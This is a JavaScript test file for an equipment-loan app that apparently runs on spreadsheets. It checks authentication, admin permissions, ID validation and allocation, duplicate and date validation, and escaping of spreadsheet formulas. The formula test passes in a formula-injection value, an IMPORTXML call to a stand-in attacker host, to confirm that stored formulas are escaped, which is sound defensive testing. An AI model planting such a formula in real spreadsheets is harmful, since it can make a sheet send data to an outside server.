'use strict';

const assert = require('node:assert/strict');
const test = require('node:test');
const {
  bootstrappedHarness,
  createEquipment,
  createUser,
  expectAppError,
  expectError,
  expectOk
} = require('./test-helpers.cjs');

test('authentication and admin authorization are enforced by server endpoints', () => {
  const harness = bootstrappedHarness();

  const unknownSignIn = harness.signInAs('unknown@example.com');
  expectError(unknownSignIn.finish.pollResponse, 'FORBIDDEN');
  expectError(harness.invoke('listEquipment', {}), 'UNAUTHENTICATED');

  const outsideSignIn = harness.signInAs('outsider@other.example');
  expectError(outsideSignIn.finish.pollResponse, 'FORBIDDEN');
  expectError(harness.invoke('listEquipment', {}), 'UNAUTHENTICATED');

  ['', 'not-a-session', `session1_${'A'.repeat(43)}`].forEach((sessionToken) => {
    expectError(harness.invokeWithToken('listEquipment', sessionToken, {}), 'UNAUTHENTICATED');
  });

  harness.setActiveEmail('admin@example.com');
  const user = createUser(harness, { suffix: 'permissions' });
  harness.setActiveEmail(user.email);
  expectError(harness.invoke('adminListUsers', {}), 'FORBIDDEN');
  expectError(harness.invoke('adminCreateCategory', {
    command_id: 'unauthorized-category',
    category_name: 'Secret category',
    prefix: 'SEC',
    status: 'ACTIVE'
  }), 'FORBIDDEN');
  assert.equal(harness.records('Categories')
    .some((category) => category.category_name === 'Secret category'), false);

  harness.setActiveEmail('admin@example.com');
  expectError(harness.invoke('adminUpdateUser', {
    command_id: 'demote-last-admin',
    edit_proof: expectOk(harness.invoke('adminListUsers', {})).items.find((row) => row.user_id === 'USR-000001').edit_proof,
    user_id: 'USR-000001',
    expected_version: 1,
    email: 'admin@example.com',
    name: 'admin',
    department: '',
    role: 'USER',
    status: 'ACTIVE'
  }), 'LAST_ACTIVE_ADMIN');
  const admin = harness.find('Users', 'user_id', 'USR-000001');
  assert.equal(admin.role, 'ADMIN');
  assert.equal(admin.status, 'ACTIVE');

  const inactive = createUser(harness, {
    suffix: 'inactive',
    status: 'INACTIVE'
  });
  const inactiveSignIn = harness.signInAs(inactive.email);
  expectError(inactiveSignIn.finish.pollResponse, 'USER_DISABLED');
  expectError(harness.invoke('getDashboard'), 'UNAUTHENTICATED');
});

test('all domain IDs use fixed-width validators', () => {
  const harness = bootstrappedHarness();

  assert.equal(harness.invoke('requireAssetId_', 'ast-000001'), 'AST-000001');
  assert.equal(harness.invoke('requireBorrowId_', 'br-000001'), 'BR-000001');
  assert.equal(harness.invoke('requireUserRecordId_', 'usr-000001'), 'USR-000001');
  assert.equal(harness.invoke('requireCategoryRecordId_', 'cat-001'), 'CAT-001');

  [
    ['requireAssetId_', 'AST-1000000'],
    ['requireAssetId_', 'AST-00001'],
    ['requireBorrowId_', 'BR-1000000'],
    ['requireBorrowId_', 'BR-00001'],
    ['requireUserRecordId_', 'USR-1000000'],
    ['requireUserRecordId_', 'USR-00001'],
    ['requireCategoryRecordId_', 'CAT-1000'],
    ['requireCategoryRecordId_', 'CAT-01']
  ].forEach(([functionName, value]) => {
    expectAppError(() => harness.invoke(functionName, value), 'VALIDATION_FAILED');
  });
});

test('ID allocation skips collisions, remains fixed width, and fails atomically at exhaustion', () => {
  const harness = bootstrappedHarness();
  createEquipment(harness, { suffix: 'allocator' });

  harness.invoke('updateRecordById_', 'Sequences', 'sequence_name', 'ASSET', {
    next_value: 1,
    updated_at: harness.invoke('nowIso_')
  });
  const skipped = Array.from(harness.invoke('nextIdsLocked_', 'ASSET', 1));
  assert.deepEqual(skipped, ['AST-000002']);

  harness.invoke('updateRecordById_', 'Sequences', 'sequence_name', 'ASSET', {
    next_value: 999999,
    updated_at: harness.invoke('nowIso_')
  });
  expectAppError(() => harness.invoke('nextIdsLocked_', 'ASSET', 2), 'ID_EXHAUSTED');
  assert.equal(harness.find('Sequences', 'sequence_name', 'ASSET').next_value, 999999,
    'a failed batch must not advance the durable sequence');

  const lastAssetId = Array.from(harness.invoke('nextIdsLocked_', 'ASSET', 1));
  assert.deepEqual(lastAssetId, ['AST-999999']);
  assert.match(lastAssetId[0], /^AST-\d{6}$/);
  assert.equal(harness.find('Sequences', 'sequence_name', 'ASSET').next_value, 1000000);
  expectAppError(() => harness.invoke('nextIdLocked_', 'ASSET'), 'ID_EXHAUSTED');

  harness.invoke('updateRecordById_', 'Sequences', 'sequence_name', 'CATEGORY', {
    next_value: 999,
    updated_at: harness.invoke('nowIso_')
  });
  assert.deepEqual(Array.from(harness.invoke('nextIdsLocked_', 'CATEGORY', 1)), ['CAT-999']);
  expectAppError(() => harness.invoke('nextIdLocked_', 'CATEGORY'), 'ID_EXHAUSTED');
});

test('business-key and date validation fail before creating duplicate domain records', () => {
  const harness = bootstrappedHarness();
  const user = createUser(harness, { suffix: 'unique' });
  const equipment = createEquipment(harness, { suffix: 'unique' });
  const counts = {
    users: harness.records('Users').length,
    equipment: harness.records('Equipment').length,
    categories: harness.records('Categories').length,
    operations: harness.records('Operations').length
  };

  expectError(harness.invoke('adminCreateUser', {
    command_id: 'duplicate-user-email',
    email: `  ${user.email.toUpperCase()}  `,
    name: 'Duplicate',
    department: '',
    role: 'USER',
    status: 'ACTIVE'
  }), 'DUPLICATE_EMAIL');

  expectError(harness.invoke('adminCreateEquipment', {
    command_id: 'duplicate-serial',
    sku: 'IT-CAM-DUP',
    name: 'Duplicate camera',
    category_id: 'CAT-004',
    serial_number: `  ${equipment.serial_number.toLowerCase()}  `,
    department: 'Operations',
    location: 'Equipment room',
    included_items: []
  }), 'DUPLICATE_SERIAL');

  expectError(harness.invoke('adminCreateCategory', {
    command_id: 'duplicate-category',
    category_name: '  camera  ',
    prefix: 'CAM2',
    status: 'ACTIVE'
  }), 'DUPLICATE_CATEGORY');

  assert.deepEqual({
    users: harness.records('Users').length,
    equipment: harness.records('Equipment').length,
    categories: harness.records('Categories').length,
    operations: harness.records('Operations').length
  }, counts);

  harness.setActiveEmail(user.email);
  expectError(harness.invoke('createBorrowRequest', {
    command_id: 'invalid-date-request',
    asset_id: equipment.asset_id,
    borrow_date: '2026-02-30',
    due_date: '2026-03-01',
    purpose: 'Invalid date',
    note: ''
  }), 'VALIDATION_FAILED');
  expectError(harness.invoke('createBorrowRequest', {
    command_id: 'reverse-date-request',
    asset_id: equipment.asset_id,
    borrow_date: '2026-03-02',
    due_date: '2026-03-01',
    purpose: 'Reverse date',
    note: ''
  }), 'VALIDATION_FAILED');
  assert.equal(harness.records('Borrow').length, 0);
});

test('spreadsheet formula prefixes are escaped at rest but removed from client DTOs', () => {
  const harness = bootstrappedHarness();
  const created = expectOk(harness.invoke('adminCreateUser', {
    command_id: 'formula-safe-user',
    email: 'formula@example.com',
    name: '=IMPORTXML("https://attacker.invalid","//x")',
    department: '+1+1',
    role: 'USER',
    status: 'ACTIVE'
  }));
  const stored = harness.find('Users', 'user_id', created.user_id);
  assert.match(stored.name, /^'=/);
  assert.match(stored.department, /^'\+/);
  assert.equal(created.name.startsWith('='), true);
  assert.equal(created.department, '+1+1');
});
